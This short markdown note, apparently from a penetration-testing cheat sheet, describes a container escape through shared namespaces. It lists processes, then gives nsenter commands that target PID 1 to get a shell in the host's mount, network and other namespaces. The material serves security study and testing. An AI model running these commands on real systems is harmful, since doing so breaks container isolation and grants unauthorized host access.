# Shared Namespaces

## STEPS

### 1) List processes

    ps aux 

### 2) If we detect anything interesting, we can invoke the command: 

    nsenter --target 1 --mount sh or: nsenter --target 1 --mount --uts --ipc --net /bin/bash

### 3) If it worked, we escaped the container!

### TIP: Interesting processes can be /sbin/init of process 1 (the parent of all processes) for example
